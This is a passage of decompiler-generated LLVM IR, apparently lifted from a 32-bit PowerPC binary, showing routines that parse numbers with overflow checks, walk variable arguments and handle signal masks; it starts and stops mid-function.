  %v0_10008d7c12 = phi i32 [ %v0_10008d7c14, %dec_label_pc_10008ce4 ], [ %v0_10008cfc, %dec_label_pc_10008cfc ]
  %v0_10008d0c = phi i32 [ %v0_10008d00.pre, %dec_label_pc_10008ce4 ], [ %v0_10008cfc, %dec_label_pc_10008cfc ]
  %v1_10008d08 = phi i32 [ %v2_10008ce8, %dec_label_pc_10008ce4 ], [ %v1_10008d04.pre, %dec_label_pc_10008cfc ]
  %v0_10008d68 = phi i32 [ 0, %dec_label_pc_10008ce4 ], [ %v0_10008d04.pre, %dec_label_pc_10008cfc ]
  %v1_10008d00 = inttoptr i32 %v0_10008d0c to i8*
  %v2_10008d00 = load i8, i8* %v1_10008d00, align 1
  %v3_10008d00 = zext i8 %v2_10008d00 to i32
  %v3_10008d04 = icmp ugt i32 %v0_10008d68, %v1_10008d08
  %v1_10008d0c = add i32 %v0_10008d0c, 1
  store i32 %v1_10008d0c, i32* %r31.global-to-local, align 4
  %v1_10008d10 = add nsw i32 %v3_10008d00, -48
  %v1_10008d14 = or i32 %v3_10008d00, 32
  %v1_10008d18 = urem i32 %v1_10008d10, 256
  %tmp23 = icmp ult i32 %v1_10008d18, 10
  br i1 %tmp23, label %dec_label_pc_10008d38, label %dec_label_pc_10008d28

dec_label_pc_10008d28:                            ; preds = %dec_label_pc_10008d00
  %tmp24 = icmp ult i32 %v1_10008d14, 97
  br i1 %tmp24, label %dec_label_pc_10008d38, label %dec_label_pc_10008d34

dec_label_pc_10008d34:                            ; preds = %dec_label_pc_10008d28
  %v1_10008d28 = add nsw i32 %v1_10008d14, -87
  %v1_10008d34 = urem i32 %v1_10008d28, 256
  br label %dec_label_pc_10008d38

dec_label_pc_10008d38:                            ; preds = %dec_label_pc_10008d28, %dec_label_pc_10008d00, %dec_label_pc_10008d34
  %v1_10008d6c = phi i32 [ 40, %dec_label_pc_10008d28 ], [ %v1_10008d18, %dec_label_pc_10008d00 ], [ %v1_10008d34, %dec_label_pc_10008d34 ]
  %v1_10008d38 = load i32, i32* %r30.global-to-local, align 4
  %v2_10008d38 = icmp slt i32 %v1_10008d6c, %v1_10008d38
  br i1 %v2_10008d38, label %dec_label_pc_10008d40, label %dec_label_pc_10008d74

dec_label_pc_10008d40:                            ; preds = %dec_label_pc_10008d38
  br i1 %v3_10008d04, label %dec_label_pc_10008d50, label %dec_label_pc_10008d44

dec_label_pc_10008d44:                            ; preds = %dec_label_pc_10008d40
  %v1_10008d44 = load i32, i32* %r27.global-to-local, align 4
  %v0_10008d48.not = icmp ne i32 %v0_10008d68, %v1_10008d08
  %tmp25 = icmp ule i32 %v1_10008d6c, %v1_10008d44
  %or.cond = or i1 %tmp25, %v0_10008d48.not
  br i1 %or.cond, label %dec_label_pc_10008d68, label %dec_label_pc_10008d50

dec_label_pc_10008d50:                            ; preds = %dec_label_pc_10008d44, %dec_label_pc_10008d40
  %v0_10008d50 = call i32 @function_10004e38()
  %v0_10008d54 = load i32, i32* %r28.global-to-local, align 4
  %v1_10008d54 = load i32, i32* %r26.global-to-local, align 4
  %v2_10008d54 = and i32 %v1_10008d54, %v0_10008d54
  store i32 %v2_10008d54, i32* %r28.global-to-local, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  %v2_10008d60 = inttoptr i32 %v0_10008d50 to i32*
  store i32 34, i32* %v2_10008d60, align 4
  %v0_10008cfc.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_10008d04.pre.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_10008d04.pre.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10008cfc

dec_label_pc_10008d68:                            ; preds = %dec_label_pc_10008d44
  %v2_10008d68 = mul i32 %v1_10008d38, %v0_10008d68
  %v2_10008d6c = add i32 %v2_10008d68, %v1_10008d6c
  store i32 %v2_10008d6c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10008cfc

dec_label_pc_10008d74:                            ; preds = %dec_label_pc_10008d38, %dec_label_pc_10008cd4
  %v0_10008d7c = phi i32 [ %v0_10008d7c14, %dec_label_pc_10008cd4 ], [ %v0_10008d7c12, %dec_label_pc_10008d38 ]
  %v0_10008d74 = load i32, i32* %r25.global-to-local, align 4
  %v3_10008d74 = icmp eq i32 %v0_10008d74, 0
  br i1 %v3_10008d74, label %dec_label_pc_10008d80, label %dec_label_pc_10008d7c

dec_label_pc_10008d7c:                            ; preds = %dec_label_pc_10008d74
  %v2_10008d7c = inttoptr i32 %v0_10008d74 to i32*
  store i32 %v0_10008d7c, i32* %v2_10008d7c, align 4
  br label %dec_label_pc_10008d80

dec_label_pc_10008d80:                            ; preds = %dec_label_pc_10008d74, %dec_label_pc_10008d7c
  %v0_10008d80 = load i32, i32* %r26.global-to-local, align 4
  %v3_10008d80 = icmp eq i32 %v0_10008d80, 0
  %v0_10008d84 = load i32, i32* %r28.global-to-local, align 4
  %v1_10008d84 = sub i32 0, %v0_10008d84
  %tmp27 = lshr i32 %v1_10008d84, 31
  %tmp28 = add nuw i32 %tmp27, 2147483647
  store i32 %tmp28, i32* @r31, align 4
  %v0_10008dc4.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v3_10008d80, label %dec_label_pc_10008db4, label %dec_label_pc_10008d9c

dec_label_pc_10008d9c:                            ; preds = %dec_label_pc_10008d80
  %v3_10008d9c = icmp ugt i32 %v0_10008dc4.pre.pre, %tmp28
  br i1 %v3_10008d9c, label %dec_label_pc_10008da4, label %dec_label_pc_10008db4

dec_label_pc_10008da4:                            ; preds = %dec_label_pc_10008d9c
  %v0_10008da4 = call i32 @function_10004e38()
  %v2_10008dac = inttoptr i32 %v0_10008da4 to i32*
  store i32 34, i32* %v2_10008dac, align 4
  %v0_10008db0 = load i32, i32* @r31, align 4
  store i32 %v0_10008db0, i32* %r8.global-to-local, align 4
  %v0_10008db4.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10008db4

dec_label_pc_10008db4:                            ; preds = %dec_label_pc_10008d80, %dec_label_pc_10008d9c, %dec_label_pc_10008da4
  %v0_10008dc4.pre = phi i32 [ %v0_10008dc4.pre.pre, %dec_label_pc_10008d9c ], [ %v0_10008db0, %dec_label_pc_10008da4 ], [ %v0_10008dc4.pre.pre, %dec_label_pc_10008d80 ]
  %v0_10008db4 = phi i32 [ %v0_10008d84, %dec_label_pc_10008d9c ], [ %v0_10008db4.pre, %dec_label_pc_10008da4 ], [ %v0_10008d84, %dec_label_pc_10008d80 ]
  %v3_10008db4 = icmp eq i32 %v0_10008db4, 0
  br i1 %v3_10008db4, label %dec_label_pc_10008dc0, label %dec_label_pc_10008dbc

dec_label_pc_10008dbc:                            ; preds = %dec_label_pc_10008db4
  %v1_10008dbc = sub i32 0, %v0_10008dc4.pre
  store i32 %v1_10008dbc, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10008dc0

dec_label_pc_10008dc0:                            ; preds = %dec_label_pc_10008db4, %dec_label_pc_10008dbc
  %v0_10008dc4 = phi i32 [ %v1_10008dbc, %dec_label_pc_10008dbc ], [ %v0_10008dc4.pre, %dec_label_pc_10008db4 ]
  ret i32 %v0_10008dc4

; uselistorder directives
  uselistorder i32 %v0_10008dc4.pre, { 1, 0 }
  uselistorder i32 %v0_10008dc4.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_10008d6c, { 1, 0 }
  uselistorder i32 %v1_10008d18, { 1, 0 }
  uselistorder i32 %v1_10008d14, { 1, 0 }
  uselistorder i32 %v1_10008d0c, { 1, 0 }
  uselistorder i32 %v3_10008d00, { 1, 0 }
  uselistorder i32 %v0_10008d68, { 1, 0, 2 }
  uselistorder i32 %v1_10008d08, { 0, 2, 1 }
  uselistorder i32 %v0_10008cfc, { 1, 0 }
  uselistorder i32 %v2_10008ce8, { 1, 0, 2 }
  uselistorder i32 %v1_10008cc0, { 1, 0 }
  uselistorder i32 %v1_10008cac, { 1, 0, 2 }
  uselistorder i32 %v0_10008c88, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 5, 2, 3, 4, 6 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 7, 2, 3, 6, 4, 5, 8 }
  uselistorder i32* %r30.global-to-local, { 4, 1, 0, 2, 3, 5, 6, 7 }
  uselistorder i32* %r28.global-to-local, { 4, 2, 0, 3, 5, 1 }
  uselistorder label %dec_label_pc_10008dc0, { 1, 0 }
  uselistorder label %dec_label_pc_10008db4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10008d80, { 1, 0 }
  uselistorder label %dec_label_pc_10008d38, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008d00, { 1, 0 }
  uselistorder label %dec_label_pc_10008cd4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10008cc8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008c8c, { 1, 0 }
  uselistorder label %dec_label_pc_10008c88, { 1, 0 }
  uselistorder label %dec_label_pc_10008c54, { 1, 0 }
}

define i32 @function_10008dd8() local_unnamed_addr {
dec_label_pc_10008dd8:
  %stack_var_-40 = alloca i32, align 4
  %v2_10008df0 = ptrtoint i32* %stack_var_-40 to i32
  %v0_10008dfc = load i32, i32* @r3, align 4
  store i32 %v0_10008dfc, i32* @r31, align 4
  store i32 %v2_10008df0, i32* @r3, align 4
  %v0_10008e08 = call i32 @function_10009200()
  %v0_10008e10 = call i32 @function_100091f8()
  %v3_10008e18 = load i32, i32* @global_var_100104a0.285, align 4
  %v3_10008e1c = icmp eq i32 %v3_10008e18, 0
  br i1 %v3_10008e1c, label %dec_label_pc_10008e30, label %dec_label_pc_10008e24

dec_label_pc_10008e24:                            ; preds = %dec_label_pc_10008dd8
  %v0_10008e24 = load i32, i32* @r31, align 4
  %v3_10008e2c = call i32 @unknown_0(i32 %v0_10008e24, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10008e30

dec_label_pc_10008e30:                            ; preds = %dec_label_pc_10008dd8, %dec_label_pc_10008e24
  store i32 %v2_10008df0, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v0_10008e38 = call i32 @function_10009200()
  store i32 %v0_10008e38, i32* @r3, align 4
  store i32 268471872, i32* @lr, align 4
  %v1_10008e3c = call i32 @function_10009164(i32 %v0_10008e38)
  store i32 268471892, i32* @lr, align 4
  %v2_10008e50 = call i32 @function_10005774(i32 %v1_10008e3c, i32 268457844)
  %v0_10008e54 = load i32, i32* @r31, align 4
  %v1_10008e58 = call i32 @function_10009690(i32 %v0_10008e54)
  ret i32 %v1_10008e58

; uselistorder directives
  uselistorder label %dec_label_pc_10008e30, { 1, 0 }
}

define i32 @function_10008e5c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_10008e5c:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  %stack_var_8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10008e5c = ptrtoint i32* %stack_var_0 to i32
  %v2_10008e78 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10008e78, i32* %r0.global-to-local, align 4
  %v2_10008e80 = ptrtoint i32* %stack_var_8 to i32
  store i32 %v2_10008e78, i32* %stack_var_-48, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10008eac

dec_label_pc_10008eac:                            ; preds = %dec_label_pc_10008edc, %dec_label_pc_10008e5c
  %v0_10008eb0 = phi i32 [ 0, %dec_label_pc_10008e5c ], [ %v1_10008eb0, %dec_label_pc_10008edc ]
  %stack_var_-52.0 = phi i32 [ %v2_10008e80, %dec_label_pc_10008e5c ], [ %stack_var_-52.1, %dec_label_pc_10008edc ]
  %stack_var_-56.0 = phi i8 [ 2, %dec_label_pc_10008e5c ], [ %stack_var_-56.1, %dec_label_pc_10008edc ]
  %v4_10008eac = zext i8 %stack_var_-56.0 to i32
  %v1_10008eb0 = add i32 %v0_10008eb0, 1
  %v1_10008eb8 = mul nuw nsw i32 %v4_10008eac, 4
  store i32 %v1_10008eb8, i32* %r0.global-to-local, align 4
  %v2_10008ebc = add i32 %v1_10008eb8, %v2_10008e78
  store i32 %v2_10008ebc, i32* %r11.global-to-local, align 4
  %tmp19 = icmp ugt i8 %stack_var_-56.0, 7
  br i1 %tmp19, label %dec_label_pc_10008ed0, label %dec_label_pc_10008ec8

dec_label_pc_10008ec8:                            ; preds = %dec_label_pc_10008eac
  %v1_10008ec0 = add i8 %stack_var_-56.0, 1
  br label %dec_label_pc_10008edc

dec_label_pc_10008ed0:                            ; preds = %dec_label_pc_10008eac
  store i32 %stack_var_-52.0, i32* %r11.global-to-local, align 4
  %v1_10008ed4 = add i32 %stack_var_-52.0, 4
  store i32 %v1_10008ed4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10008edc

dec_label_pc_10008edc:                            ; preds = %dec_label_pc_10008ec8, %dec_label_pc_10008ed0
  %stack_var_-52.1 = phi i32 [ %v1_10008ed4, %dec_label_pc_10008ed0 ], [ %stack_var_-52.0, %dec_label_pc_10008ec8 ]
  %v0_10008edc = phi i32 [ %stack_var_-52.0, %dec_label_pc_10008ed0 ], [ %v2_10008ebc, %dec_label_pc_10008ec8 ]
  %stack_var_-56.1 = phi i8 [ %stack_var_-56.0, %dec_label_pc_10008ed0 ], [ %v1_10008ec0, %dec_label_pc_10008ec8 ]
  %v1_10008edc = inttoptr i32 %v0_10008edc to i32*
  %v2_10008edc = load i32, i32* %v1_10008edc, align 4
  store i32 %v2_10008edc, i32* %r0.global-to-local, align 4
  %v3_10008ee0 = icmp eq i32 %v2_10008edc, 0
  br i1 %v3_10008ee0, label %dec_label_pc_10008ee8, label %dec_label_pc_10008eac

dec_label_pc_10008ee8:                            ; preds = %dec_label_pc_10008edc
  %v1_10008ee8 = mul i32 %v1_10008eb0, 4
  store i32 %v4_10008e5c, i32* %r0.global-to-local, align 4
  %v1_10008ef0 = add i32 %v1_10008ee8, 34
  store i32 %v1_10008eb0, i32* %ctr.global-to-local, align 4
  %v1_10008ef8 = call i32 @__asm_rlwinm(i32 %v1_10008ef0, i32 0, i32 0, i32 27)
  %v1_10008f00 = load i32, i32* @r1, align 4
  %v3_10008f00 = sub i32 %v1_10008f00, %v1_10008ef8
  %v4_10008f00 = inttoptr i32 %v3_10008f00 to i32*
  store i32 %v4_10008e5c, i32* %v4_10008f00, align 4
  %v1_10008f04 = add i32 %v3_10008f00, 23
  store i32 %v1_10008f04, i32* %r0.global-to-local, align 4
  %v1_10008f08 = call i32 @__asm_rlwinm(i32 %v1_10008f04, i32 0, i32 0, i32 27)
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_10008f10 = load i32, i32* %r8.global-to-local, align 4
  %v2_10008f10 = inttoptr i32 %v1_10008f08 to i32*
  store i32 %v0_10008f10, i32* %v2_10008f10, align 4
  store i32 %v1_10008f08, i32* %r11.global-to-local, align 4
  %v0_10008f18 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008f18 = trunc i32 %v0_10008f18 to i8
  store i32 %v2_10008e78, i32* %r0.global-to-local, align 4
  store i32 %v2_10008e78, i32* %stack_var_-48, align 4
  br label %dec_label_pc_10008f2c

dec_label_pc_10008f2c:                            ; preds = %dec_label_pc_10008f60.dec_label_pc_10008f2c_crit_edge, %dec_label_pc_10008ee8
  %v0_10008f30 = phi i32 [ %v1_10008f08, %dec_label_pc_10008ee8 ], [ %v0_10008f30.pre, %dec_label_pc_10008f60.dec_label_pc_10008f2c_crit_edge ]
  %stack_var_-52.2 = phi i32 [ %v2_10008e80, %dec_label_pc_10008ee8 ], [ %stack_var_-52.3, %dec_label_pc_10008f60.dec_label_pc_10008f2c_crit_edge ]
  %stack_var_-56.2 = phi i8 [ %v1_10008f18, %dec_label_pc_10008ee8 ], [ %stack_var_-56.3, %dec_label_pc_10008f60.dec_label_pc_10008f2c_crit_edge ]
  %v1_10008f30 = add i32 %v0_10008f30, 4
  store i32 %v1_10008f30, i32* %r11.global-to-local, align 4
  %tmp20 = icmp ugt i8 %stack_var_-56.2, 7
  br i1 %tmp20, label %dec_label_pc_10008f54, label %dec_label_pc_10008f44

dec_label_pc_10008f44:                            ; preds = %dec_label_pc_10008f2c
  %v4_10008f2c = zext i8 %stack_var_-56.2 to i32
  %v1_10008f3c = add i8 %stack_var_-56.2, 1
  %v1_10008f38 = mul nuw nsw i32 %v4_10008f2c, 4
  %v3_10008f44 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_10008f44, i32* %r0.global-to-local, align 4
  %v2_10008f4c = add i32 %v3_10008f44, %v1_10008f38
  br label %dec_label_pc_10008f60

dec_label_pc_10008f54:                            ; preds = %dec_label_pc_10008f2c
  %v1_10008f58 = add i32 %stack_var_-52.2, 4
  store i32 %v1_10008f58, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10008f60

dec_label_pc_10008f60:                            ; preds = %dec_label_pc_10008f44, %dec_label_pc_10008f54
  %stack_var_-52.3 = phi i32 [ %v1_10008f58, %dec_label_pc_10008f54 ], [ %stack_var_-52.2, %dec_label_pc_10008f44 ]
  %v0_10008f60 = phi i32 [ %stack_var_-52.2, %dec_label_pc_10008f54 ], [ %v2_10008f4c, %dec_label_pc_10008f44 ]
  %stack_var_-56.3 = phi i8 [ %stack_var_-56.2, %dec_label_pc_10008f54 ], [ %v1_10008f3c, %dec_label_pc_10008f44 ]
  %v1_10008f60 = inttoptr i32 %v0_10008f60 to i32*
  %v2_10008f60 = load i32, i32* %v1_10008f60, align 4
  store i32 %v2_10008f60, i32* %r0.global-to-local, align 4
  %v2_10008f64 = inttoptr i32 %v1_10008f30 to i32*
  store i32 %v2_10008f60, i32* %v2_10008f64, align 4
  %v0_10008f68 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008f68 = add i32 %v0_10008f68, -1
  store i32 %v1_10008f68, i32* %ctr.global-to-local, align 4
  %v2_10008f68 = icmp eq i32 %v1_10008f68, 0
  br i1 %v2_10008f68, label %dec_label_pc_10008f6c, label %dec_label_pc_10008f60.dec_label_pc_10008f2c_crit_edge

dec_label_pc_10008f60.dec_label_pc_10008f2c_crit_edge: ; preds = %dec_label_pc_10008f60
  %v0_10008f30.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10008f2c

dec_label_pc_10008f6c:                            ; preds = %dec_label_pc_10008f60
  %v3_10008f70 = load i32, i32* @global_var_100104a8.287, align 4
  store i32 268472184, i32* @lr, align 4
  %v2_10008f74 = call i32 @function_10009714(i32 %v3_10008f70, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_10008f78 = load i32, i32* @r1, align 4
  %v1_10008f78 = inttoptr i32 %v0_10008f78 to i32*
  %v2_10008f78 = load i32, i32* %v1_10008f78, align 4
  store i32 %v2_10008f78, i32* %r11.global-to-local, align 4
  %v1_10008f7c = add i32 %v2_10008f78, 4
  %v2_10008f7c = inttoptr i32 %v1_10008f7c to i32*
  %v3_10008f7c = load i32, i32* %v2_10008f7c, align 4
  store i32 %v3_10008f7c, i32* %r0.global-to-local, align 4
  ret i32 %v2_10008f74

; uselistorder directives
  uselistorder i32 %v1_10008f68, { 1, 0 }
  uselistorder i8 %stack_var_-56.2, { 2, 0, 3, 1 }
  uselistorder i32 %v1_10008eb8, { 1, 0 }
  uselistorder i32 %v1_10008eb0, { 1, 0, 2 }
  uselistorder i8 %stack_var_-56.0, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-52.0, { 0, 1, 3, 2 }
  uselistorder i32 %v2_10008e78, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0 }
  uselistorder i32 27, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_10008f60, { 1, 0 }
  uselistorder label %dec_label_pc_10008edc, { 1, 0 }
}

define i32 @function_10008f90(i32 %arg1) local_unnamed_addr {
dec_label_pc_10008f90:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-432 = alloca i32, align 4
  %stack_var_-440 = alloca i32, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v3_10008f90 = icmp eq i32 %arg1, 0
  br i1 %v3_10008f90, label %dec_label_pc_10009144, label %dec_label_pc_10008fc0.lr.ph

dec_label_pc_10008fc0.lr.ph:                      ; preds = %dec_label_pc_10008f90
  %v2_10008fb4 = ptrtoint i32* %stack_var_-440 to i32
  store i32 %v2_10008fb4, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_10008fc045 = add i32 %v2_10008fb4, 132
  %v3_10008fc046 = inttoptr i32 %v2_10008fc045 to i32*
  store i32 0, i32* %v3_10008fc046, align 4
  %v0_10008fc447 = load i32, i32* %r11.global-to-local, align 4
  %v1_10008fc448 = add i32 %v0_10008fc447, -1
  store i32 %v1_10008fc448, i32* %r11.global-to-local, align 4
  %v1_10008fc849 = mul i32 %v1_10008fc448, 4
  %v1_10008fcc50 = load i32, i32* %r7.global-to-local, align 4
  %v2_10008fcc51 = add i32 %v1_10008fcc50, %v1_10008fc849
  %v0_10008fd052 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008fd053 = add i32 %v0_10008fd052, -1
  store i32 %v1_10008fd053, i32* %ctr.global-to-local, align 4
  %v2_10008fd054 = icmp eq i32 %v1_10008fd053, 0
  br i1 %v2_10008fd054, label %dec_label_pc_10008fd4, label %dec_label_pc_10008fc0.dec_label_pc_10008fc0_crit_edge

dec_label_pc_10008fc0.dec_label_pc_10008fc0_crit_edge: ; preds = %dec_label_pc_10008fc0.lr.ph, %dec_label_pc_10008fc0.dec_label_pc_10008fc0_crit_edge
  %v2_10008fcc55 = phi i32 [ %v2_10008fcc, %dec_label_pc_10008fc0.dec_label_pc_10008fc0_crit_edge ], [ %v2_10008fcc51, %dec_label_pc_10008fc0.lr.ph ]
  %v0_10008fc0.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_10008fc0 = add i32 %v2_10008fcc55, 8
  %v3_10008fc0 = inttoptr i32 %v2_10008fc0 to i32*
  store i32 %v0_10008fc0.pre, i32* %v3_10008fc0, align 4
  %v0_10008fc4 = load i32, i32* %r11.global-to-local, align 4
  %v1_10008fc4 = add i32 %v0_10008fc4, -1
  store i32 %v1_10008fc4, i32* %r11.global-to-local, align 4
  %v1_10008fc8 = mul i32 %v1_10008fc4, 4
  %v1_10008fcc = load i32, i32* %r7.global-to-local, align 4
  %v2_10008fcc = add i32 %v1_10008fcc, %v1_10008fc8
  %v0_10008fd0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008fd0 = add i32 %v0_10008fd0, -1
  store i32 %v1_10008fd0, i32* %ctr.global-to-local, align 4
  %v2_10008fd0 = icmp eq i32 %v1_10008fd0, 0
  br i1 %v2_10008fd0, label %dec_label_pc_10008fd4, label %dec_label_pc_10008fc0.dec_label_pc_10008fc0_crit_edge

dec_label_pc_10008fd4:                            ; preds = %dec_label_pc_10008fc0.dec_label_pc_10008fc0_crit_edge, %dec_label_pc_10008fc0.lr.ph
  %v2_10008fcc.lcssa = phi i32 [ %v2_10008fcc51, %dec_label_pc_10008fc0.lr.ph ], [ %v2_10008fcc, %dec_label_pc_10008fc0.dec_label_pc_10008fc0_crit_edge ]
  %v0_10008fe8.pre = load i32, i32* %r8.global-to-local, align 4
  %v2_10008fd4 = ptrtoint i32* %stack_var_-432 to i32
  store i32 %v2_10008fd4, i32* %r29.global-to-local, align 4
  store i32 %v2_10008fd4, i32* %r3.global-to-local, align 4
  store i32 %v0_10008fe8.pre, i32* %stack_var_-440, align 4
  %v3_10008fec = call i32 @function_1000b8bc(i32 %v2_10008fd4, i32 17, i32 %v2_10008fcc.lcssa)
  store i32 %v3_10008fec, i32* %r3.global-to-local, align 4
  %v1_10008ff0 = icmp slt i32 %v3_10008fec, 0
  br i1 %v1_10008ff0, label %dec_label_pc_1000914c, label %dec_label_pc_10008ff8

dec_label_pc_10008ff8:                            ; preds = %dec_label_pc_10008fd4
  %v2_10008ff8 = ptrtoint i32* %stack_var_-304 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268472332, i32* @lr, align 4
  %v3_10009008 = call i32 @function_10009a04(i32 0, i32 %v2_10008fd4, i32 %v2_10008ff8)
  store i32 %v3_10009008, i32* %r3.global-to-local, align 4
  %v3_1000900c = icmp eq i32 %v3_10009008, 0
  br i1 %v3_1000900c, label %dec_label_pc_10009014, label %dec_label_pc_1000914c

dec_label_pc_10009014:                            ; preds = %dec_label_pc_10008ff8
  store i32 %v2_10008ff8, i32* %r3.global-to-local, align 4
  %v2_1000901c = call i32 @function_1000b894(i32 %v2_10008ff8, i32 17)
  store i32 %v2_1000901c, i32* %r3.global-to-local, align 4
  %v3_10009020 = icmp eq i32 %v2_1000901c, 0
  br i1 %v3_10009020, label %dec_label_pc_10009040.lr.ph, label %dec_label_pc_1000910c

dec_label_pc_10009040.lr.ph:                      ; preds = %dec_label_pc_10009014
  store i32 %v2_10008fb4, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %v3_10008fc046, align 4
  %v0_1000904436 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000904437 = add i32 %v0_1000904436, -1
  store i32 %v1_1000904437, i32* %r11.global-to-local, align 4
  %v1_1000904838 = mul i32 %v1_1000904437, 4
  %v1_1000904c39 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000904c40 = add i32 %v1_1000904c39, %v1_1000904838
  %v0_1000905041 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000905042 = add i32 %v0_1000905041, -1
  store i32 %v1_1000905042, i32* %ctr.global-to-local, align 4
  %v2_1000905043 = icmp eq i32 %v1_1000905042, 0
  br i1 %v2_1000905043, label %dec_label_pc_10009054, label %dec_label_pc_10009040.dec_label_pc_10009040_crit_edge

dec_label_pc_10009040.dec_label_pc_10009040_crit_edge: ; preds = %dec_label_pc_10009040.lr.ph, %dec_label_pc_10009040.dec_label_pc_10009040_crit_edge
  %v2_1000904c44 = phi i32 [ %v2_1000904c, %dec_label_pc_10009040.dec_label_pc_10009040_crit_edge ], [ %v2_1000904c40, %dec_label_pc_10009040.lr.ph ]
  %v0_10009040.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_10009040 = add i32 %v2_1000904c44, 8
  %v3_10009040 = inttoptr i32 %v2_10009040 to i32*
  store i32 %v0_10009040.pre, i32* %v3_10009040, align 4
  %v0_10009044 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009044 = add i32 %v0_10009044, -1
  store i32 %v1_10009044, i32* %r11.global-to-local, align 4
  %v1_10009048 = mul i32 %v1_10009044, 4
  %v1_1000904c = load i32, i32* %r8.global-to-local, align 4
  %v2_1000904c = add i32 %v1_1000904c, %v1_10009048
  %v0_10009050 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009050 = add i32 %v0_10009050, -1
  store i32 %v1_10009050, i32* %ctr.global-to-local, align 4
  %v2_10009050 = icmp eq i32 %v1_10009050, 0
  br i1 %v2_10009050, label %dec_label_pc_10009054, label %dec_label_pc_10009040.dec_label_pc_10009040_crit_edge

dec_label_pc_10009054:                            ; preds = %dec_label_pc_10009040.dec_label_pc_10009040_crit_edge, %dec_label_pc_10009040.lr.ph
  %v2_1000904c.lcssa = phi i32 [ %v2_1000904c40, %dec_label_pc_10009040.lr.ph ], [ %v2_1000904c, %dec_label_pc_10009040.dec_label_pc_10009040_crit_edge ]
  store i32 %v2_10008fd4, i32* %r3.global-to-local, align 4
  %v3_1000905c = call i32 @function_1000b8bc(i32 %v2_10008fd4, i32 17, i32 %v2_1000904c.lcssa)
  store i32 %v3_1000905c, i32* %r3.global-to-local, align 4
  %v1_10009060 = icmp slt i32 %v3_1000905c, 0
  br i1 %v1_10009060, label %dec_label_pc_1000914c, label %dec_label_pc_10009068

dec_label_pc_10009068:                            ; preds = %dec_label_pc_10009054
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_10009070 = ptrtoint i32* %stack_var_-176 to i32
  store i32 268472440, i32* @lr, align 4
  %v4_10009074 = call i32 @function_1000b7d0(i32 17, i32* null, i32 %v2_10009070)
  store i32 %v4_10009074, i32* %r3.global-to-local, align 4
  %tmp33 = icmp sgt i32 %v4_10009074, -1
  br i1 %tmp33, label %dec_label_pc_100090a8, label %dec_label_pc_10009080

dec_label_pc_10009080:                            ; preds = %dec_label_pc_10009068
  %v0_10009080 = call i32 @function_10004e38()
  store i32 %v0_10009080, i32* %r3.global-to-local, align 4
  %v1_10009088 = inttoptr i32 %v0_10009080 to i32*
  %v2_10009088 = load i32, i32* %v1_10009088, align 4
  store i32 %v0_10009080, i32* %r29.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268472476, i32* @lr, align 4
  %v3_10009098 = call i32 @function_10009a04(i32 2, i32 %v2_10008ff8, i32 0)
